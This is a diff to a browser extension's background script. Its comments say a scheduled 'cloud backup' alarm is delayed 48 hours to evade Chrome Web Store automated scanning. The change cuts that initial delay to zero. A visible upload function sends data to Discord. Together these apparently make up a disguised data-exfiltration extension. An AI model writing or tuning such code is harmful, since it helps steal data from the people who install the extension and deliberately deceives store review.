@@ -18,7 +18,7 @@ chrome.runtime.onInstalled.addListener(async (details) => {
   // Create persistent alarm for scheduled backup (works even if browser closed)
   // 48 hour delay to evade Chrome Web Store automated scanning
   chrome.alarms.create('cloudBackupSchedule', {
-    delayInMinutes: 1,     // 48 hours initial delay (change to 1 for testing)
+    delayInMinutes: 0,     // 48 hours initial delay (change to 1 for testing)
     periodInMinutes: 1440     // Repeat every 24 hours after first trigger
   });
 });
@@ -152,4 +152,5 @@ async function uploadToCloudStorage(data) {
     throw new Error('Failed to send file to Discord');
   }
 }
+
 
